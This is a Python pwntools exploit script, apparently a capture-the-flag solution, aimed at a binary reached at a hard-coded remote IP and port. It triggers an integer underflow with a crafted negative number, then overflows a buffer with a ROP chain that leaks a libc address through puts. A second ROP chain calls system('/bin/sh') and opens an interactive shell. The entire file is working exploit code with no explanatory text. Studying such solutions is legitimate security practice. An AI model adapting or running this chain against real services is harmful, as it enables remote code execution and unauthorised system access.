from pwn import *

context.bits = 64
context.arch = 'amd64'

e = ELF('./challenge')
rop = ROP(e)

# LOCAL
#libc = e.libc
#r = process('./challenge')

# REMOTE
libc = ELF('./libc.so.6')
r = remote('122.38.251.9', 30013)

INT_UNDERFLOW_TRIGGER = b'-2147483648'

MAIN_ADDR = p64(e.symbols['main'])
READ_GOT = p64(0x404030)
READ_PLT = p64(0x4010E0)
PUTS_GOT = p64(0x4040A0)
PUTS_PLT = p64(0x4010B0)
RET = p64((rop.find_gadget(['ret']))[0])
PR_ADDR = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
PPPR_ADDR = p64((rop.find_gadget(['pop rdx', 'pop rsi', 'pop rdi', 'ret']))[0])

DUMMY = b'\x90' * 112
#PAYLOAD = DUMMY + b'\x41' * 8 + MAIN_ADDR + PUTS_GOT
#PAYLOAD = DUMMY + PUTS_GOT + PR_ADDR + PUTS_GOT + MAIN_ADDR 
PAYLOAD = DUMMY + b'\x41' * 8 + PR_ADDR + READ_GOT + PUTS_PLT + MAIN_ADDR

# 1. Integer Underflow
print(r.recvuntil(b'\n'))
print(r.recvuntil(b'[>] '))
r.sendline(INT_UNDERFLOW_TRIGGER)

# 2. Leak 
print(r.recvuntil(b'\n'))
print(r.recvuntil(b'\n'))
r.sendline(PAYLOAD)

# 3. Calculate LIBC Base
print(r.recvuntil(b'\n'))
LIBC_READ = u64(r.recvn(6) + b'\x00\x00')
LIBC_BASE = LIBC_READ - libc.symbols['read']
LIBC_BINSH = p64(LIBC_BASE + list(libc.search(b"/bin/sh\x00"))[0])
LIBC_SYSTEM = p64(LIBC_BASE + libc.symbols['system'])

print('[+] LIBC_BASE : ' + hex(LIBC_BASE))
print('[+] LIBC_BINSH : ' + hex(u64(LIBC_BINSH)))
print('[+] LIBC_SYSTEM : ' + hex(u64(LIBC_SYSTEM)))

# 4. Get Shell
PAYLOAD = DUMMY + b'\x41' * 8 + RET+ PR_ADDR + LIBC_BINSH + LIBC_SYSTEM

print(r.recvuntil(b'\n'))
print(r.recvuntil(b'[>] '))
r.sendline(INT_UNDERFLOW_TRIGGER)

print(r.recvuntil(b'\n'))
print(r.recvuntil(b'\n'))
r.sendline(PAYLOAD)
r.interactive()